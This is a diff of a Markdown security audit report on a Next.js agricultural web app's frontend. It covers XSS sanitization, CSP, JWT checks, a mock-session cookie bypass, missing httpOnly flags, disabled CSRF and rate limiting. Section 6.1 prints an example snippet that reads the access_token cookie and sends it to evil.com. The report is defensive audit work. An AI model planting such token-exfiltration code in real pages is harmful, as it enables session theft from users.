@@ -1,4 +1,5 @@
 # Web Application Security Audit Report
+
 **Application:** SAHOOL Next.js Web Application
 **Path:** `/home/user/sahool-unified-v15-idp/apps/web`
 **Date:** 2026-01-06
@@ -19,6 +20,7 @@ This report provides a comprehensive security audit of the SAHOOL Next.js web ap
 ### ✅ STRENGTHS
 
 #### 1.1 dangerouslySetInnerHTML Protection
+
 **Location:** `/home/user/sahool-unified-v15-idp/apps/web/src/lib/security/nonce.ts`
 
 The application has **excellent** XSS protection for inline scripts:
@@ -35,6 +37,7 @@ The application has **excellent** XSS protection for inline scripts:
 - ✅ **Comprehensive test coverage** at `/home/user/sahool-unified-v15-idp/apps/web/src/lib/security/__tests__/nonce-validation.test.ts`
 
 **Example Protection:**
+
 ```typescript
 // This will be REJECTED in production
 createInlineScript('eval("malicious")', nonce);
@@ -42,6 +45,7 @@ createInlineScript('eval("malicious")', nonce);
 ```
 
 #### 1.2 Input Sanitization
+
 **Location:** `/home/user/sahool-unified-v15-idp/apps/web/src/lib/validation.ts`
 
 - ✅ Comprehensive sanitizer library with:
@@ -52,12 +56,14 @@ createInlineScript('eval("malicious")', nonce);
   - Filename sanitization (prevents path traversal)
 
 **Example:**
+
 ```typescript
 sanitizers.html('<script>alert("xss")</script>');
 // Returns: 'alertxss' (tags removed)
 ```
 
 #### 1.3 API Client Input Validation
+
 **Location:** `/home/user/sahool-unified-v15-idp/apps/web/src/lib/api/client.ts`
 
 - ✅ Email sanitization before login (line 198)
@@ -67,11 +73,13 @@ sanitizers.html('<script>alert("xss")</script>');
 ### ⚠️ AREAS FOR IMPROVEMENT
 
 #### 1.4 User-Generated Content Display
+
 **Risk Level:** Medium
 
 **Issue:** While sanitization exists, need to verify all user-generated content is sanitized before display.
 
 **Recommendation:**
+
 ```typescript
 // Ensure all user content uses escapeHtml or sanitizers
 import { sanitizers } from '@/lib/validation';
@@ -84,6 +92,7 @@ import { sanitizers } from '@/lib/validation';
 ```
 
 **Files to Review:**
+
 - `/home/user/sahool-unified-v15-idp/apps/web/src/features/community/components/PostCard.tsx`
 - `/home/user/sahool-unified-v15-idp/apps/web/src/features/community/components/Feed.tsx`
 - Any component displaying user comments/messages
@@ -99,6 +108,7 @@ import { sanitizers } from '@/lib/validation';
 The CSP implementation is **production-grade**:
 
 #### 2.1 CSP Configuration
+
 - ✅ **Nonce-based CSP** for inline scripts and styles
 - ✅ **Cryptographically secure nonce** generation (Web Crypto API)
 - ✅ **Strict directives:**
@@ -117,6 +127,7 @@ The CSP implementation is **production-grade**:
 - ✅ **Rate limiting** on CSP reports (100/minute per IP)
 
 #### 2.2 Middleware Integration
+
 **Location:** `/home/user/sahool-unified-v15-idp/apps/web/src/middleware.ts`
 
 - ✅ Nonce generated per request
@@ -128,6 +139,7 @@ The CSP implementation is **production-grade**:
   - `Referrer-Policy: strict-origin-when-cross-origin`
 
 #### 2.3 Global Security Headers
+
 **Location:** `/home/user/sahool-unified-v15-idp/apps/web/next.config.js`
 
 - ✅ `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`
@@ -140,12 +152,14 @@ The CSP implementation is **production-grade**:
 ### ⚠️ MINOR IMPROVEMENTS
 
 #### 2.4 External Resource Integrity
+
 **Risk Level:** Low
 **Location:** `/home/user/sahool-unified-v15-idp/apps/web/src/app/layout.tsx`
 
 **Issue:** External resources lack Subresource Integrity (SRI) for Google Fonts.
 
 **Current (line 50):**
+
 ```tsx
 <link
   href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap"
@@ -154,11 +168,12 @@ The CSP implementation is **production-grade**:
 ```
 
 **Recommended:**
+
 ```tsx
 <link
   href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap"
   rel="stylesheet"
-  integrity="sha384-[hash]"  // Add SRI hash
+  integrity="sha384-[hash]" // Add SRI hash
   crossOrigin="anonymous"
 />
 ```
@@ -172,12 +187,14 @@ The CSP implementation is **production-grade**:
 ### ✅ EXCELLENT - NO HARDCODED SECRETS
 
 **Findings:**
+
 - ✅ **No hardcoded API keys** found in source code
 - ✅ **Environment variables** properly used for sensitive data
 - ✅ **Example file only** (`.env.example`) - no actual secrets committed
 - ✅ **Proper warnings** in `.env.example` about changing defaults
 
 **Environment Variables Used:**
+
 ```bash
 # Authentication (properly secured)
 JWT_SECRET_KEY (from env)
@@ -194,38 +211,48 @@ NEXT_PUBLIC_MAPBOX_TOKEN (public - requires token restriction)
 ### ⚠️ RECOMMENDATIONS
 
 #### 3.1 Mapbox Token Security
+
 **Risk Level:** Medium
 **Location:** `.env.example` line 70
 
 **Current:**
+
 ```bash
 NEXT_PUBLIC_MAPBOX_TOKEN=pk.your-mapbox-token-here
 ```
 
 **Recommendation:**
+
 - ⚠️ Use **URL-restricted** Mapbox tokens in production
 - Configure token restrictions at: https://account.mapbox.com/access-tokens/
 - Limit to specific domains (e.g., `app.sahool.io`)
 
 #### 3.2 JWT Secret Strength
+
 **Location:** `.env.example` line 39
 
 **Current Warning (Good!):**
+
 ```bash
 # WARNING: CHANGE THESE IN PRODUCTION!
 JWT_SECRET_KEY=your-secret-key-min-32-chars-change-in-production
 ```
 
 **Recommendation:**
+
 - ✅ Warning is present (good)
 - ⚠️ Add validation in code to **reject weak secrets** in production:
 
 ```typescript
 // In route-guard.tsx or startup
-if (process.env.NODE_ENV === 'production') {
+if (process.env.NODE_ENV === "production") {
   const secret = process.env.JWT_SECRET_KEY;
-  if (!secret || secret.length < 32 || secret.includes('change-in-production')) {
-    throw new Error('SECURITY: JWT_SECRET_KEY must be changed in production');
+  if (
+    !secret ||
+    secret.length < 32 ||
+    secret.includes("change-in-production")
+  ) {
+    throw new Error("SECURITY: JWT_SECRET_KEY must be changed in production");
   }
 }
 ```
@@ -237,6 +264,7 @@ if (process.env.NODE_ENV === 'production') {
 ### ✅ STRONG IMPLEMENTATION
 
 #### 4.1 JWT Token Verification
+
 **Location:** `/home/user/sahool-unified-v15-idp/apps/web/src/lib/auth/route-guard.tsx`
 
 - ✅ **Secure JWT verification** using `jose` library (line 85)
@@ -247,15 +275,17 @@ if (process.env.NODE_ENV === 'production') {
 - ✅ **Type-safe user extraction** (lines 100-105)
 
 **Security Features:**
+
 ```typescript
 const { payload } = await jose.jwtVerify(token, secretKey, {
-  issuer,    // Validates token issuer
-  audience,  // Validates intended recipient
+  issuer, // Validates token issuer
+  audience, // Validates intended recipient
 });
 // Automatic expiration and signature verification
 ```
 
 #### 4.2 Server-Side Route Protection
+
 **Location:** `/home/user/sahool-unified-v15-idp/apps/web/src/middleware.ts`
 
 - ✅ Protected routes list (lines 26-39)
@@ -264,6 +294,7 @@ const { payload } = await jose.jwtVerify(token, secretKey, {
 - ✅ Automatic redirect to login with return URL (lines 88-91)
 
 #### 4.3 Permission & Role-Based Access
+
 **Location:** `/home/user/sahool-unified-v15-idp/apps/web/src/lib/auth/route-guard.tsx`
 
 - ✅ `requireAuth()` - Basic authentication
@@ -275,21 +306,23 @@ const { payload } = await jose.jwtVerify(token, secretKey, {
 ### ⚠️ SECURITY CONCERNS
 
 #### 4.4 Mock Authentication in Production Code
+
 **Risk Level:** HIGH ⚠️
 **Location:** `/home/user/sahool-unified-v15-idp/apps/web/src/stores/auth.store.tsx`
 
 **Issue:** Mock session support exists in production code (lines 68-84, 90-105)
 
 **Current Code:**
+
 ```typescript
 // Check for mock user session (used in E2E tests)
-const mockSession = Cookies.get('user_session');
+const mockSession = Cookies.get("user_session");
 if (mockSession) {
   try {
     const mockUser = JSON.parse(mockSession);
     setUser({
-      id: mockUser.id || 'test-user',
-      email: mockUser.email || 'test@sahool.com',
+      id: mockUser.id || "test-user",
+      email: mockUser.email || "test@sahool.com",
       // ... bypasses real authentication
     });
     return;
@@ -298,24 +331,30 @@ if (mockSession) {
 ```
 
 **CRITICAL SECURITY ISSUE:**
+
 - 🔴 Allows authentication bypass via `user_session` cookie
 - 🔴 No environment check (works in production!)
 - 🔴 No signature/validation of mock session
 
 **IMMEDIATE FIX REQUIRED:**
+
 ```typescript
 // Only allow mock sessions in test environments
-const mockSession = Cookies.get('user_session');
-if (mockSession && (process.env.NODE_ENV === 'test' || process.env.E2E_TESTING === 'true')) {
+const mockSession = Cookies.get("user_session");
+if (
+  mockSession &&
+  (process.env.NODE_ENV === "test" || process.env.E2E_TESTING === "true")
+) {
   // Mock session logic
 }
 // Remove entirely in production build
 ```
 
 **Better Solution:**
+
 ```typescript
 // Use separate auth store for tests
-if (process.env.NODE_ENV === 'production') {
+if (process.env.NODE_ENV === "production") {
   // Never check mock sessions
   setUser(null);
   return;
@@ -323,38 +362,43 @@ if (process.env.NODE_ENV === 'production') {
 ```
 
 #### 4.5 Cookie Security Issues
+
 **Risk Level:** MEDIUM ⚠️
 **Location:** `/home/user/sahool-unified-v15-idp/apps/web/src/stores/auth.store.tsx`
 
 **Issue 1: Client-Side Cookie Setting**
+
 ```typescript
 // Line 36-40 - Client-side cookie
-Cookies.set('access_token', access_token, {
+Cookies.set("access_token", access_token, {
   expires: 7,
   secure: true,
-  sameSite: 'strict'
+  sameSite: "strict",
 });
 ```
 
 **Problems:**
+
 - 🔴 **No `httpOnly` flag** (JavaScript can access token)
 - 🔴 **XSS can steal tokens** if XSS exists
 - 🔴 Note acknowledges this (line 35) but doesn't fix it
 
 **Recommendation:**
 Set authentication cookies **server-side only**:
+
 ```typescript
 // Server-side (API route or middleware)
-response.cookies.set('access_token', token, {
-  httpOnly: true,  // ← Critical!
+response.cookies.set("access_token", token, {
+  httpOnly: true, // ← Critical!
   secure: true,
-  sameSite: 'strict',
+  sameSite: "strict",
   maxAge: 7 * 24 * 60 * 60, // 7 days in seconds
-  path: '/'
+  path: "/",
 });
 ```
 
 **Issue 2: Cookie Name Inconsistency**
+
 - Middleware checks `access_token` (middleware.ts line 85)
 - Route guard checks `sahool_token` (route-guard.tsx line 61)
 - Auth store uses `access_token` (auth.store.tsx line 36)
@@ -368,6 +412,7 @@ response.cookies.set('access_token', token, {
 ### ⚠️ PARTIAL IMPLEMENTATION
 
 #### 5.1 CSRF Infrastructure Exists
+
 **Location:** `/home/user/sahool-unified-v15-idp/apps/web/src/lib/security/security.ts`
 
 - ✅ CSRF token retrieval function (line 69)
@@ -375,10 +420,11 @@ response.cookies.set('access_token', token, {
 - ✅ Secure fetch wrapper with CSRF (line 96)
 
 **Available Functions:**
+
 ```typescript
-getCsrfToken()      // Get token from cookie
-getCsrfHeaders()    // Get headers for request
-secureFetch()       // Fetch with CSRF + credentials
+getCsrfToken(); // Get token from cookie
+getCsrfHeaders(); // Get headers for request
+secureFetch(); // Fetch with CSRF + credentials
 ```
 
 ### 🔴 CRITICAL ISSUE: CSRF Not Enabled
@@ -386,6 +432,7 @@ secureFetch()       // Fetch with CSRF + credentials
 **Problem:** CSRF protection exists but **is not used**!
 
 **Evidence:**
+
 1. **API client doesn't use CSRF tokens**
    Location: `/home/user/sahool-unified-v15-idp/apps/web/src/lib/api/client.ts`
    - Standard `fetch()` used (line 114)
@@ -403,6 +450,7 @@ secureFetch()       // Fetch with CSRF + credentials
 **RECOMMENDATION - HIGH PRIORITY:**
 
 #### Option 1: Enable Full CSRF Protection
+
 ```typescript
 // 1. Generate CSRF token server-side (in middleware or API route)
 import { generateNonce } from '@/lib/security/csp-config';
@@ -428,6 +476,7 @@ headers: {
 ```
 
 #### Option 2: Rely on SameSite + Origin Checks
+
 ```typescript
 // If not implementing CSRF tokens:
 // 1. Ensure ALL cookies use sameSite: 'strict' ✅ (already done)
@@ -446,6 +495,7 @@ headers: {
 **Location:** `/home/user/sahool-unified-v15-idp/apps/web/src/stores/auth.store.tsx` (line 36-40)
 
 Current cookie configuration:
+
 ```typescript
 {
   expires: 7,           // ✅ Reasonable expiration
@@ -455,10 +505,11 @@ Current cookie configuration:
 ```
 
 **Security.ts Cookie Helper:**
+
 ```typescript
 setSecureCookie(name, value, {
-  secure: true,         // ✅ Default secure
-  sameSite: 'strict',   // ✅ Default strict
+  secure: true, // ✅ Default secure
+  sameSite: "strict", // ✅ Default strict
   // httpOnly: true     // ⚠️ Not supported client-side
 });
 ```
@@ -466,34 +517,41 @@ setSecureCookie(name, value, {
 ### 🔴 CRITICAL ISSUES
 
 #### 6.1 Missing HttpOnly Flag
+
 **Risk Level:** HIGH
 
 **Issue:** Authentication tokens accessible to JavaScript
+
 - Vulnerable to XSS token theft
 - If XSS exists, attacker can steal `access_token` cookie
 
 **Impact:**
+
 ```javascript
 // Malicious script can steal token:
 const token = document.cookie.match(/access_token=([^;]+)/)[1];
 // Send to attacker's server
-fetch('https://evil.com/steal?token=' + token);
+fetch("https://evil.com/steal?token=" + token);
 ```
 
 **FIX:** Move cookie setting to server-side (see Section 4.5)
 
 #### 6.2 Cookie Scope Issues
+
 **Risk Level:** MEDIUM
 
 **Issue 1: No domain restriction**
+
 - Cookies set without `domain` attribute
 - May be sent to subdomains unintentionally
 
 **Issue 2: No path restriction**
+
 - Cookies sent to all paths
 - Should restrict to `/` or specific paths
 
 **Recommended Configuration:**
+
 ```typescript
 {
   httpOnly: true,        // Server-side only!
@@ -521,17 +579,20 @@ fetch('https://evil.com/steal?token=' + token);
 **Finding:** Frontend application **does not execute SQL queries**.
 
 **Architecture:**
+
 - ✅ All database access through backend API
 - ✅ Frontend only makes HTTP requests
 - ✅ No raw SQL in frontend code
 - ✅ Backend APIs responsible for SQL sanitization
 
 **Verification:**
+
 - Searched for: `sql`, `query`, `SELECT`, `INSERT`, `UPDATE`, `DELETE FROM`
 - Found: Only in documentation and type definitions
 - No SQL query execution in frontend code
 
 **API Client Pattern:**
+
 ```typescript
 // Frontend sends JSON, backend handles SQL
 async getFields(tenantId: string) {
@@ -542,6 +603,7 @@ async getFields(tenantId: string) {
 ```
 
 **Recommendation:**
+
 - ✅ Maintain current architecture
 - ⚠️ Ensure backend APIs use **parameterized queries**
 - ⚠️ Audit backend services separately (not in scope)
@@ -557,6 +619,7 @@ async getFields(tenantId: string) {
 #### 8.1 Security Features
 
 **Route Protection:**
+
 ```typescript
 // Line 48-117
 ✅ Public routes allow-list (whitelist approach)
@@ -567,6 +630,7 @@ async getFields(tenantId: string) {
 ```
 
 **Security Headers:**
+
 ```typescript
 // Line 104-114
 ✅ X-Frame-Options: DENY
@@ -577,6 +641,7 @@ async getFields(tenantId: string) {
 ```
 
 **Nonce Generation:**
+
 ```typescript
 // Line 98-101
 ✅ Cryptographically secure nonce per request
@@ -585,6 +650,7 @@ async getFields(tenantId: string) {
 ```
 
 #### 8.2 Internationalization Handling
+
 ```typescript
 // Line 41-68
 ✅ next-intl middleware integration
@@ -595,51 +661,54 @@ async getFields(tenantId: string) {
 ### ⚠️ MINOR IMPROVEMENTS
 
 #### 8.3 Matcher Configuration
+
 **Location:** Line 120-129
 
 **Current:**
+
 ```typescript
-matcher: [
-  '/((?!_next/static|_next/image|favicon.ico|.*\\..*|api).*)',
-]
+matcher: ["/((?!_next/static|_next/image|favicon.ico|.*\\..*|api).*)"];
 ```
 
 **Issue:** API routes excluded from middleware
+
 - CSP headers not set on API routes
 - May be intentional, but verify
 
 **Recommendation:**
+
 ```typescript
 // If API routes need security headers:
-matcher: [
-  '/((?!_next/static|_next/image|favicon.ico).*)',
-]
+matcher: ["/((?!_next/static|_next/image|favicon.ico).*)"];
 ```
 
 #### 8.4 Rate Limiting in Middleware
+
 **Risk Level:** LOW
 
 **Current:** No rate limiting in main middleware
 **Found:** Rate limiting only in `/api/csp-report` route
 
 **Recommendation:** Consider adding rate limiting for:
+
 - Login attempts (prevent brute force)
 - API requests (prevent DoS)
 
 **Example:**
+
 ```typescript
-import { isRateLimited } from '@/lib/rate-limiter';
+import { isRateLimited } from "@/lib/rate-limiter";
 
 // In middleware
-const clientIP = request.headers.get('x-forwarded-for') || 'unknown';
+const clientIP = request.headers.get("x-forwarded-for") || "unknown";
 const limited = await isRateLimited(clientIP, {
   windowMs: 60000,
   maxRequests: 100,
-  keyPrefix: 'api',
+  keyPrefix: "api",
 });
 
 if (limited) {
-  return NextResponse.json({ error: 'Too many requests' }, { status: 429 });
+  return NextResponse.json({ error: "Too many requests" }, { status: 429 });
 }
 ```
 
@@ -654,11 +723,13 @@ if (limited) {
 #### 9.1 Features
 
 **Dual Storage:**
+
 - ✅ **Redis** for production (distributed, persistent)
 - ✅ **In-memory** fallback for development
 - ✅ Automatic failover on Redis errors
 
 **Security:**
+
 ```typescript
 // Line 193-206
 ✅ Per-identifier rate limiting
@@ -670,6 +741,7 @@ if (limited) {
 ```
 
 **Production-Ready:**
+
 - ✅ Error handling with graceful degradation
 - ✅ Retry strategy for Redis connections
 - ✅ Logging for debugging
@@ -678,6 +750,7 @@ if (limited) {
 #### 9.2 Current Usage
 
 **CSP Report Endpoint:**
+
 ```typescript
 // /api/csp-report/route.ts line 18-22
 ✅ 100 requests per minute per IP
@@ -690,12 +763,14 @@ if (limited) {
 #### 9.3 Expand Rate Limiting
 
 **Not rate-limited (should be):**
+
 1. **Login endpoint** - vulnerable to brute force
 2. **API requests** - vulnerable to DoS
 3. **File uploads** - vulnerable to resource exhaustion
 4. **Password reset** - vulnerable to enumeration
 
 **Recommended Limits:**
+
 ```typescript
 // Login attempts
 {
@@ -726,18 +801,20 @@ if (limited) {
 ### 10.1 Error Handling
 
 **✅ Good Practices:**
+
 - Error boundary implementation (`/components/common/ErrorBoundary.tsx`)
 - Logging to `/api/log-error` endpoint
 - No sensitive data in client-side errors
 
 **⚠️ Recommendation:**
 Verify error messages don't leak sensitive information:
+
 ```typescript
 // Bad
 throw new Error(`Database query failed: ${sql}`);
 
 // Good
-throw new Error('Unable to process request');
+throw new Error("Unable to process request");
 // Log details server-side only
 ```
 
@@ -746,6 +823,7 @@ throw new Error('Unable to process request');
 **Location:** `/home/user/sahool-unified-v15-idp/apps/web/src/lib/ws/index.ts`
 
 **Recommendations:**
+
 1. ⚠️ Authenticate WebSocket connections
 2. ⚠️ Validate all incoming WebSocket messages
 3. ⚠️ Implement rate limiting for WebSocket events
@@ -756,28 +834,32 @@ throw new Error('Unable to process request');
 **Location:** `/home/user/sahool-unified-v15-idp/apps/web/src/lib/api/client.ts` (line 329)
 
 **✅ Current Protections:**
+
 - File type validation (JPEG, PNG, WebP only)
 - File size limit (10MB)
 - Timeout protection (60 seconds)
 
 **⚠️ Recommendations:**
+
 1. Add magic byte validation (not just extension)
 2. Scan uploaded files for malware
 3. Store uploads outside web root
 4. Generate random filenames (prevent overwrite)
 
 **Example:**
+
 ```typescript
 // Validate magic bytes
 const isValidImage = await validateImageMagicBytes(file);
 if (!isValidImage) {
-  return { success: false, error: 'Invalid image file' };
+  return { success: false, error: "Invalid image file" };
 }
 ```
 
 ### 10.4 Dependency Security
 
 **Recommendation:** Run regular security audits:
+
 ```bash
 npm audit
 npm audit fix
@@ -791,6 +873,7 @@ pnpm audit
 **⚠️ Caution:** `NEXT_PUBLIC_*` variables exposed to browser
 
 **Current Public Variables:**
+
 ```bash
 NEXT_PUBLIC_API_URL
 NEXT_PUBLIC_WS_URL
@@ -803,6 +886,7 @@ NEXT_PUBLIC_ENABLE_*
 **✅ These are acceptable** (non-sensitive configuration)
 
 **🔴 NEVER expose:**
+
 - Database credentials
 - JWT secrets
 - API secrets
@@ -874,24 +958,28 @@ The application demonstrates **strong security practices** in many areas:
 ## Recommended Immediate Actions
 
 ### Week 1: Critical Fixes
+
 1. Remove mock authentication from production code
 2. Implement server-side cookie setting with `httpOnly`
 3. Standardize cookie names across application
 4. Add JWT secret validation in production
 
 ### Week 2: CSRF & Rate Limiting
+
 5. Implement CSRF token generation and validation
 6. Add rate limiting to login endpoint
 7. Add rate limiting to API endpoints
 8. Configure Mapbox token URL restrictions
 
 ### Week 3: Final Hardening
+
 9. Add SRI hashes for external resources
 10. Implement WebSocket authentication
 11. Add file upload magic byte validation
 12. Document security architecture and decisions
 
 ### Ongoing: Security Maintenance
+
 - Run `npm audit` weekly
 - Monitor CSP violation reports
 - Review authentication logs
@@ -903,6 +991,7 @@ The application demonstrates **strong security practices** in many areas:
 ## Compliance & Standards
 
 ### Frameworks Considered:
+
 - ✅ **OWASP Top 10 (2021)** - Addressed
 - ✅ **CWE/SANS Top 25** - Mitigated
 - ⚠️ **PCI DSS** - Requires httpOnly cookies (Section 4.5)
@@ -922,6 +1011,7 @@ The SAHOOL web application has a **solid security foundation** with excellent CS
 Once these issues are resolved, the application will meet **production security standards** for a modern web application.
 
 **Recommended Next Steps:**
+
 1. Address HIGH priority issues immediately
 2. Implement MEDIUM priority fixes before launch
 3. Schedule regular security audits
@@ -932,4 +1022,3 @@ Once these issues are resolved, the application will meet **production security 
 **Report Generated:** 2026-01-06
 **Scope:** Frontend Web Application Only
 **Note:** Backend API security should be audited separately
-
